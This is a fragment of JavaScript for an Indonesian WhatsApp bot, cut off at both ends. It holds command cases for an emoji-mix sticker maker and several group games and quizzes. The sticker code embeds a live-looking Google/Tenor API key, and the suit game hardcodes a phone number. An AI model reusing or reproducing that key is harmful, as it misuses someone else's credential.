if (!emoji1) return Reply(`Contoh : ${prefix + command} 😅+🤔`)
if (!emoji2) return Reply(`Contoh : ${prefix + command} 😅+🤔`)
//Reply(mess.wait)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await Ditss.sendAsSticker(m.chat, res.url, m, {
packname: global.packname,
author: 'HiraaXz',
categories: res.tags
})
//await fs.unlinkSync(encmedia)
}
 
}
break

case'Connect':{
m.reply('oke')
}
break

case 'suit':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');
if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(sender))) return Reply(`Selesaikan suit mu yang sebelumnya`)
const mark = `6289505624515@s.whatsapp.net`
if (!froms) return Reply(`Siapa yang ingin kamu tantang?\nTag orangnya!\n\nContoh: *${command}* @${mark.split('@')[0]}`)
if (froms === botNumber) return Reply(`Tidak bisa bermain dengan bot!`)
if (froms === sender) return Reply(`Sad amat main ama diri sendiri`)
if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(froms))) return Reply(`Orang yang kamu tantang sedang bermain suit bersama orang lain :)`)
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
var hadiah = randomNomor(10, 20)
let poin = 1000
let poin_lose = 1000
let timeout = 60000
let id = 'suit_' + new Date() * 1
suit[id] = {
chat: await Reply(`@${sender.split('@')[0]} menantang @${froms.split('@')[0]} untuk bermain suit dengan taruhan Saldo Rp. 2,000\n\n*Kirim (gas/gamau)* untuk bermain\n\n*Hadiah Pemenang :* Rp. 2,000\n*Hukuman Kalah :* - Rp. 2,000`),
id: id,
p: sender,
p2: froms,
status: 'wait',
hadiah: hadiah,
waktu: setTimeout(() => {
if (suit[id]) Ditss.sendMessage(from, {text: `_Waktu suit habis!_` })
delete suit[id]
}, 60000), poin, poin_lose, timeout
}
break
case 'tictactoe': case 'ttt': case 'ttc': case 'xox':
//if (!isRegistered) return registerbut(noregis)
if (!m.isGroup) return onlyGroup()
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');
if (from in tictactoe) return Reply(`Masih ada game yang blum selesai`)
if (!froms) return Reply(`Kirim perintah *${command}* @tag atau Reply pesan orangnya!`)
if (froms === botNumber) return Reply(`Tidak bisa bermain dengan bot!`)
if (froms === sender) return Reply(`Sad amat main ama diri sendiri`)
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
var hadiah = randomNomor(10, 20)
await Reply(`@${sender.split('@')[0]} menantang @${froms.split('@')[0]} untuk bermain TicTacToe\n\n*Kirim (Y/N)* untuk bermain\n\nHadiah : ${hadiah} balance`)
tictactoe[from] = {
id: from,
status: null,
hadiah: hadiah,
penantang: sender,
ditantang: froms,
TicTacToe: ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣']
}
break
case 'delttt': case 'delttc':
//if (!isRegistered) return registerbut(noregis)
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`)
if (!m.isGroup) return onlyGroup()
if (!(from in tictactoe)) return Reply(`Tidak ada sesi game tictactoe di grup ini`)
if (isAdmins || isOwner) {
delete tictactoe[from];
Reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else if (tictactoe[from].penantang.includes(sender)) {
delete tictactoe[from];
Reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else if (tictactoe[from].ditantang.includes(sender)) {
delete tictactoe[from];
Reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else {
Reply(`Anda tidak bisa menghapus sesi tictactoe karena bukan pemain!`)
}
break
case 'petakbom':
//if (!isRegistered) return registerbut(noregis)
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');
if (sender in petakbom) return Reply(`Game mu masih belum terselesaikan, lanjutkan yukk\n\n${petakbom[sender].board.join("")}\n\nKirim ${prefix}delpetakbom untuk menghapus game petak bom`);
function shuffle(array) {
return array.sort(() => Math.random() - 0.5);
}
petakbom[sender] = {
petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0, 0]),
board: ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"],
bomb: 3,
lolos: 7,
pick: 0,
hadiah: randomNomor(5000, 10000),
nyawa: ["❤️", "❤️", "❤️"]
};
await Reply(`*PETAK BOM*

${petakbom[sender].board.join("")}

Pilih lah nomor tersebut! dan jangan sampai terkena Bom!
Bomb : ${petakbom[sender].bomb}
Nyawa : ${petakbom[sender].nyawa.join("")}`);
break
case 'delpetakbom':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (!(sender in petakbom)) return Reply(`kamu sedang tidak bermain petakbom!`)
delete petakbom[sender];
conn.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
Reply(`Petakbom di akhiri, hadiah Rp. 0`)
break
case 'tebakgambar':
//if (!isRegistered) return registerbut(noregis)
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if(!m.isGroup) return onlyGroup()
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { img, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakgambar.json')));
console.log('Jawaban : '+jawaban)
var teks1 = `*GAME TEBAK GAMBAR*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nDeskripsi: ${deskripsi}\nWaktu: ${gamewaktu} detik`
await Ditss.sendMessage(from, {image: {url: img}, caption: teks1}, {quoted: m})
tebakgambar[from] = {
soal: img,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (tebakgambar[from]) Reply(`Waktu habis!\nJawabannya adalah: ${tebakgambar[from].jawaban}`);
delete tebakgambar[from];
}, gamewaktu * 1000)
}
break
case 'tebakanime':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { image, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakanime.json')));
console.log('Jawaban : '+jawaban)
var teks1 = `*GAME TEBAK ANIME*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`
await Ditss.sendMessage(from, {image: {url: image}, caption: teks1}, {quoted: m})
tebakanime[from] = {
soal: image,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakanime[from]) Reply(`Waktu habis!\nJawabannya adalah: ${tebakanime[from].jawaban}`);
delete tebakanime[from];
}, gamewaktu * 1000)
}
break
case 'tebaklagu':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, artis, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebaklagu.json')));
console.log('Jawaban : '+jawaban)
if (jawaban.toLowerCase() == 'audio tidak ditemukan, silahkan request ulang!') return Reply('Maaf terjadi kesalahan!')
var teks1 = `*GAME TEBAK LAGU*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nArtist: ${artis}\nWaktu: ${gamewaktu} detik`
await Ditss.sendMessage(from, {audio: {url: soal}, mimetype: 'audio/mpeg', ptt: true}, {quoted: m}).then(res => {conn.sendMessage(from, teks1, res)})
tebaklagu[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebaklagu[from]) Reply(`Waktu habis\nJawabannya adalah: ${tebaklagu[from].jawaban}`);
delete tebaklagu[from];
}, gamewaktu * 1000)
}
break
case 'kuis':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/kuis.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME KUIS*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
kuis[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (kuis[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete kuis[from];
}, gamewaktu * 1000)
}
break
case 'tebakkalimat':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakkalimat.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME TEBAK KALIMAT*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkalimat[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkalimat[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkalimat[from];
}, gamewaktu * 1000)
}
break
case 'tebakkata':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`)
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakkata.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME TEBAK KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkata[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkata[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkata[from];
}, gamewaktu * 1000)
}
break
case 'tebaklirik':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebaklirik.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME TEBAK LIRIK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebaklirik[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebaklirik[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebaklirik[from];
}, gamewaktu * 1000)
}
break
case 'tebakkimia':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakkimia.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME TEBAK KIMIA*\n\nSoal: ${soal}\nWaktu: ${gamewaktu} detik`)
tebakkimia[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkimia[from]) Reply(`Waktu berakhir :(\nNama unsur dari lambang ${soal}\n\nAdalah: ${monospace(jawaban)}`)
delete tebakkimia[from];
}, gamewaktu * 1000)
}
break
case 'tebakbendera':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakbendera.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME TEBAK BENDERA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakbendera[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakbendera[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakbendera[from];
}, gamewaktu * 1000)
}
break
case 'susunkata':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/susunkata.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME SUSUN KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
susunkata[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (susunkata[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete susunkata[from];
}, gamewaktu * 1000)
}
break
case 'asahotak':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
